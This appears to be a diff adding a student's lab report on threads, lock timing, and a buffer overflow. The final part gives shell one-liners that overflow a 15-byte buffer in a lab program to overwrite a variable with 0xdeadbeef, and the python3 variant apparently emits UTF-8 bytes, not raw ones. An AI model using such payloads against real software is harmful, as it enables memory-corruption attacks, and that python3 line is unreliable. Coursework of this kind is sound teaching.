@@ -1,0 +1,27 @@
+# Lab 4 — Part 2
+
+## Step 2: Modified `thr1.cc`
+I added two threads that print “D” and “E” alongside the original A,B,C.
+
+## Step 4: Why `thr2.cc` behaves oddly
+When I ran `./thr2`, both threads printed the same value because the loop index was passed by address. By the time the threads read it, it had changed. Each thread must receive its own copy of the argument to avoid this race.
+
+# Lab 4 — Part 4
+
+Implementation                                   | System Time | User Time | Real Time
+pthread_mutex (./count)                          | 1.014 s     | 2.228 s   | 1.637 s
+spin lock with pthread_yield() (./count_spin)    | 0.184 s     | 0.519 s   | 0.361 s
+spin lock without pthread_yield() (./count_spin) | 0.189 s     | 0.514 s   | 0.361 s
+
+Q1. The “with‑yield” spin‐lock spent slightly more user time (0.519 s vs 0.514 s) because each pthread_yield() invocation adds extra function‑call and scheduling overhead inside the busy‑spin loop.
+
+Q2. The mutex version (./count) incurred far more system time (1.014 s) than the yield‑based spin‐lock (0.184 s) because pthread_mutex_lock/unlock enter the kernel (futex/syscalls) on each contention, whereas our spin‑lock stays mostly in user‑space, only occasionally calling sched_yield().
+
+## Part 7: Buffer Overflow
+
+- **Target variable**: `set_me` sits immediately after the 15‐byte buffer.
+- **Exploit bytes** (little endian): `\xef\xbe\xad\xde`
+- **Payload**:
+  ```bash
+  ./buffer "$(python3 -c 'print("A"*15 + "\xef\xbe\xad\xde")')"
+  ./buffer "$(printf 'AAAAAAAAAAAAAAA\xef\xbe\xad\xde')"
